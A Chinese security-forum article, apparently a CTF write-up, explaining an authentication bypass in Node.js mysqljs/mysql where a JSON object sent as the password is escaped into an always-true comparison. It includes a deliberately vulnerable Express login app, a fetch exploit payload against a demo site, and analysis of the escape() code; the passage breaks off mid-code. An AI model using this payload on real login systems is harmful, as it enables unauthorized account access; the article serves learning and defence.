---
title: Mysqljs的一个小trick
url: https://forum.butian.net/share/3853
source: 奇安信攻防社区
date: 2024-11-12
fetch_date: 2025-10-06T19:13:36.891570
---

# Mysqljs的一个小trick

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Mysqljs的一个小trick

* [CTF](https://forum.butian.net/topic/52)

这个知识点在blackhat mea ctf2024中出现了，所以就拿出来学习了，没想到在mysql中还有这种打法

前言
==
这个知识点在blackhat mea ctf2024中出现了，所以就拿出来学习了，没想到在mysql中还有这种打法。
0xff 简要
=======
首先是在nodejs生态中比较重要的一个包mysqljs/mysql中发现了一种利用转义函数来进行sql注入的一个点。
通常来说，一些常规的防御函数都会被使用在一些场景来进行过滤操作，但是在mysqljs中因为其一些特性使得它可以进行绕过一些常见的过滤函数从而进行sql注入，这里的话主要讨论在sql注入中的万能密码。
并且这类的注入比较不常规，所以在一般sql注入的字典中是见不到这些playload的。
诸如:connect.escape()、mysql.escape()和pool.esacape()这类的函数也会被影响。
demo1
-----
这里是一个简单的实例
```js
app.post("/auth", function(request, respond){
var username = request.body.username;
var password = request.body.password;
if(username && password){
connection.query(
"SELECT \* FROM accounts WHERE username = ? AND password = ?",
[username,password],
function(error,result, field){
......
}
);
});
}
```
在大多数人的第一眼中，这个看起来是很安全的，但是因为`express`这个包的特性，所以我们可以利用这个来把username和passowrd的值给他改为其他数据类型例如obj boolean Array
接下来就是exp，这里的话直接fetch
```js
data = {
username : "admin",
password:{
password: 1,
},
};
fetch("https://sqli.blog-demo.flatt.training/auth",{
headers:{
"content-type": "application/json",
},
body: JSON.stringify(data),
method: "POST",
mode: "cors",
credentials: "include",
})
.then((r) => r.text())
.then((r) => {
console.log(r);
});
```
这里其实应该就就能看见我们是把password的值改为了password的对象。
利用
==
这里的话我们利用<https://github.com/stypr/vulnerable-nodejs-express-mysql> 这个来进行演示。
首先进来是一个登录页面
![Pasted image 20241017191344.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/10/attach-b261d3e6b9fa670ff96620d656055021f5ae494a.png)
然后这里是他的一些路由
```js
/\*
Reference: https://codeshack.io/basic-login-system-nodejs-express-mysql/
\*/
var mysql = require("mysql");
var express = require("express");
var session = require("express-session");
var bodyParser = require("body-parser");
var path = require("path");
var connection = mysql.createConnection({
host: "db",
user: "login",
password: "login",
database: "login",
});
var app = express();
app.use(
session({
secret: require("crypto").randomBytes(64).toString("hex"),
resave: true,
saveUninitialized: true,
})
);
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.get("/", function (request, response) {
response.sendFile(path.join(\_\_dirname + "/login.html"));
});
app.post("/auth", function (request, response) {
var username = request.body.username;
var password = request.body.password;
if (username && password) {
connection.query(
"SELECT \* FROM accounts WHERE username = ? AND password = ?",
[username, password],
function (error, results, fields) {
if (results.length > 0) {
request.session.loggedin = true;
request.session.username = username;
response.redirect("/home");
} else {
response.send("Incorrect Username and/or Password!");
}
response.end();
}
);
} else {
response.send("Please enter Username and Password!");
response.end();
}
});
app.get("/home", function (request, response) {
if (request.session.loggedin) {
response.send("Welcome back, " + request.session.username + "!");
} else {
response.send("Please login to view this page!");
}
response.end();
});
app.listen(3000);
```
我们这里可以看到这里有三个路由
- /
- auth
- home
并且在auth处是做了鉴权操作的，然后在home的地方就可以返回当前用户的用户名
![Pasted image 20241017191630.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/10/attach-0269840a0da31029f8c3d06ae31e09e3d6bf2923.png)
我们可以看到这里的admin账号是不知道他的密码的。
这里的话我们进行登录抓包
![Pasted image 20241017191754.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/10/attach-3d55917bb3c03ace4f20902f2ca6da1870d91661.png)
可以看到这里的密码是错误的，然后我们再把它更改为一个对象，即password他本身
![Pasted image 20241017191842.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/10/attach-a98e73bd739d52c2fdaad99a27ad607b302acaee.png)
可以看到这里做了一个重定向，而且刚好是路由中的登录页面，也就是说我们成功进行了登录，这里的话我们再抓一次包来看看跳转之后的页面
![Pasted image 20241017191949.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/10/attach-d8c01193d15cece1b6bf52b27497ce4e247ca57c.png)
可以看到我们这里是登录成功了。
同样的，我们也可以在google或者firefox中进行一个fetch然后在console处进行一个操作
原因分析
====
首先我们来看一下官方的doc <https://github.com/mysqljs/mysql/blob/master/Readme.md#escaping-query-values>
文档中指出了一般来说为了阻止sql注入会利用：
- `mysql.escape()`, `connection.escape()` or `pool.escape()`的方法
```sql
var userId = 'some user provided value';
var sql = 'SELECT \* FROM users WHERE id = ' + connection.escape(userId);
connection.query(sql, function (error, results, fields) {
if (error) throw error;
// ...
});
```
- 利用`?`作为placeholder并且可以放置多个placeholder来进行抵御攻击。
```sql
connection.query('SELECT \* FROM users WHERE id = ?', [userId], function (error, results, fields) {
if (error) throw error;
// ...
});
```
等等，并且说明了不同类型的值会影响escaped，这里的话贴一下
- Numbers are left untouched
- Booleans are converted to `true` / `false`
- Date objects are converted to `'YYYY-mm-dd HH:ii:ss'` strings
- Buffers are converted to hex strings, e.g. `X'0fa5'`
- Strings are safely escaped
- Arrays are turned into list, e.g. `['a', 'b']` turns into `'a', 'b'`
- Nested arrays are turned into grouped lists (for bulk inserts), e.g. `[['a', 'b'], ['c', 'd']]` turns into `('a', 'b'), ('c', 'd')`
- Objects that have a `toSqlString` method will have `.toSqlString()` called and the returned value is used as the raw SQL.
- Objects are turned into `key = 'val'` pairs for each enumerable property on the object. If the property's value is a function, it is skipped; if the property's value is an object, toString() is called on it and the returned value is used.
- `undefined` / `null` are converted to `NULL`
- `NaN` / `Infinity` are left as-is. MySQL does not support these, and trying to insert them as values will trigger MySQL errors until they implement support.
所以我们先来看看`escape`函数他是如何处理的
<https://github.com/mysqljs/sqlstring>
```js
SqlString.escape = function escape(val, stringifyObjects, timeZone) {
if (val === undefined || val === null) {
return 'NULL';
}
switch (typeof val) {
case 'boolean': return (val) ? 'true' : 'false';
case 'number': return val + '';
case 'object':
if (val instanceof Date) {
return SqlString.dateToString(val, timeZone || 'local');
} else if (Array.isArray(val)) {
return SqlString.arrayToList(val, timeZone);
} else if (Buffer.isBuffer(val)) {
return SqlString.bufferToString(val);
} else if (typeof val.toSqlString === 'function') {
return String(val.toSqlString());
} else if (stringifyObjects) {
return escapeString(val.toString());
} else {
return SqlString.objectToValues(val, timeZone);
}
default: return escapeString(val);
}
};
...
SqlString.objectToValues = function objectToValues(object, timeZone) {
var sql = '';
for (var key in object) {
var val = object[key];
if (typeof val === 'function') {
continue;
}
sql += (sql.length === 0 ? '' : ', ') + SqlString.escapeId(key) + ' = ' + SqlString.escape(val, true, timeZone);
}
return sql;
};
```
这里我们写一个js我们可以看到不同的值
```js
var mysql = require("mysql");
var connection = mysql.createConnection({
host: "127.0.0.1:3306",
user: "root",
password: "password",
database: "test",
});
// log query
connection.on("enqueue", function (sequence) {
if ("Query" === sequence.constructor.name) {
console.log(sequence.sql);
}
});
// username and password
var username = "admin";
var password\_list = [
12341234, // Numbers
true, // Booleans
new Date("December 17, 1995 03:24:00"), // Date
new String("test\_password\_string"), // String Object
"test\_password\_string", // String
["array\_test\_1", "array\_test\_2...